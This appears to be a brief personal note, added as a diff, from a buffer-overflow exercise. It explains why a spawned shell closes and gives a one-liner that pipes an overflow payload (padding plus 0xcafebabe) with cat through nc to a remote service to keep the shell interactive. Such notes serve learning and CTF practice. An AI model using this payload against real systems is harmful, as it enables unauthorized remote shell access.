@@ -1,0 +1,11 @@
+sometimes the shell will immediately close
+this is when youve overflowed and cause something to do /bin/sh
+
+https://stackoverflow.com/questions/54375848/what-is-the-difference-between-python-c-print-and-python-c-print-cat
+
+(python -c 'print "a"*24 +"\xbe\xba\xfe\xca"'; cat) | nc destination port
+
+
+This will first run the printf command, then run the cat. 
+cat will read from standard input after printf ended, so the console will act as an interactive again.
+
